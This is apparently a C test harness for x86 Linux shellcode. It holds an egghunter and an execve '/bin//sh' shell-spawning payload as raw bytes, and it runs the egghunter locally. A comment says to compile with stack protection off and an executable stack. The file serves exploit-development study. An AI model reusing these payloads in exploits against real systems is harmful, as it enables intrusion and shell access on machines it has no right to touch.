// Remember to build with gcc -fno-stack-protector -z execstack!

#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x1a\x6a\x0c\x58\xcd\x80\x3c\xf2\x74\xef\xb8\x90\x50\x90\x50\x40\x89\xd7\xaf\x75\xe9\xff\xe7"; 

unsigned char shellcode[] = 
    "\x91\x50\x90\x50" //EGG
    "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"; //SHELLCODE 

int main(void)
{
    printf("Egghunter length: %d\n", strlen(egghunter));
    printf("Shellcode length: %d\n", strlen(shellcode));
    
    // Cast shellcode string to a function that takes and returns 
    // nothing (void) and execute it
    (*(void(*)(void))egghunter)();

    return 0;
}
